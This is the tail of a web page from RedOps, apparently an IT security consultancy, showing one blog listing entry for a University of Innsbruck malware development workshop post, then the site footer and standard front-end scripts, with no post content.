    <div class="post-date">
        2024-02-05
    </div>
    <div class="blog-title">
        University of Innsbruck-Malware Development Workshop
    </div>
    <div class="author">
        Daniel Feichter
    </div>
</a>
                    </li>
                            </ul>
        </div>
    </div>
        </main>
        <button type="button" id="BackToTop">Back to top</button>
        <footer id="Footer" class="bg-dark">
            <div class="footer container">
    <div class="info">
        <div class="logo">
            RedOps
        </div>
        <div class="mission">
            <p>At <strong>RedOps</strong>, we see ourselves as an IT security sparring partner for our customers, helping you to incrementally improve your organisation's IT security posture and cyber resilience.</p>
        </div>
        <div class="contact-us">
            <p>
                Contact us
            </p>
            <a href="mailto:office@redops.at" class="email glitch" data-plausible-event="click:email" data-plausible-props="footer" data-content="office@redops.at">
                office@redops.at
            </a>
        </div>
        <div class="social-networks">
            <a href="https://www.linkedin.com/in/daniel-feichter-5277a0140/" class="linkedin">linkedin</a>
            <a href="https://twitter.com/VirtualAllocEx" class="twitter">twitter</a>
        </div>
        <div class="links">
            <div class="heading">
                Links
            </div>
            <ul class="link-list">
                                                    <li class="link-entry">
                        <a href="https://redops.at/en/expertise" class="glitch" data-content="Services">Services</a>
                    </li>
                                    <li class="link-entry">
                        <a href="https://redops.at/en/about-us" class="glitch" data-content="About Us">About Us</a>
                    </li>
                                    <li class="link-entry">
                        <a href="https://redops.at/en/kontakt" class="glitch" data-content="Contact">Contact</a>
                    </li>
                            </ul>
        </div>
        <div class="legal">
            <div class="heading">
                Legal
            </div>
            <ul class="legal-list">
                                                <li class="legal-entry">
                    <a href="https://redops.at/en/impressum" class="glitch" data-content="Imprint">Imprint</a>
                </li>
                <li class="legal-entry">
                    <a href="https://redops.at/en/privacy" class="glitch" data-content="Privacy Statement">Privacy Statement</a>
                </li>
            </ul>
        </div>
    </div>
    <div class="copyright">
        <div class="redops">
            Â© 2024 REDOPS
        </div>
        <div class="bitperfect">
            <span class="text">Created by</span>
            <a href="https://bitperfect.at" class="glitch" data-content="bitperfect">bitperfect</a>
        </div>
    </div>
        <div class="footer-link">
        <a href="https://redops.at/en/knowledge-base" class="link h1 glitch" data-content="Knowledge Base">
            Knowledge Base
        </a>
    </div>
</div>
        </footer>

        <script type="module">!function(){const e=document.createElement("link").relList;if(!(e&&e.supports&&e.supports("modulepreload"))){for(const e of document.querySelectorAll('link[rel="modulepreload"]'))r(e);new MutationObserver((e=>{for(const o of e)if("childList"===o.type)for(const e of o.addedNodes)if("LINK"===e.tagName&&"modulepreload"===e.rel)r(e);else if(e.querySelectorAll)for(const o of e.querySelectorAll("link[rel=modulepreload]"))r(o)})).observe(document,{childList:!0,subtree:!0})}function r(e){if(e.ep)return;e.ep=!0;const r=function(e){const r={};return e.integrity&&(r.integrity=e.integrity),e.referrerpolicy&&(r.referrerPolicy=e.referrerpolicy),"use-credentials"===e.crossorigin?r.credentials="include":"anonymous"===e.crossorigin?r.credentials="omit":r.credentials="same-origin",r}(e);fetch(e.href,r)}}();</script>
<script type="module" src="https://redops.at/dist/assets/main-DC6VkGeL.js" crossorigin="" onload="e=new CustomEvent('vite-script-loaded', {detail:{path: 'resources/js/main.ts'}});document.dispatchEvent(e);"></script>
<link href="https://redops.at/dist/assets/main-ioE-islD.css" rel="stylesheet" media="all" onload="this.media='all'">
            <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js" integrity="sha512-9khQRAUBYEJDCDVP2yw3LRUQvjJ0Pjx0EShmaQjcHa6AXiOv6qHQu9lCAIR8O+/D8FtaCoJ2c0Tf9Xo7hYH01Q==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js" integrity="sha512-SkmBfuA2hqjzEVpmnMt/LINrjop3GKWqsuLSSB3e7iBmYK7JuWw4ldmmxwD9mdm2IRTTi0OxSAfEGvgEi0i2Kw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    

</body></html>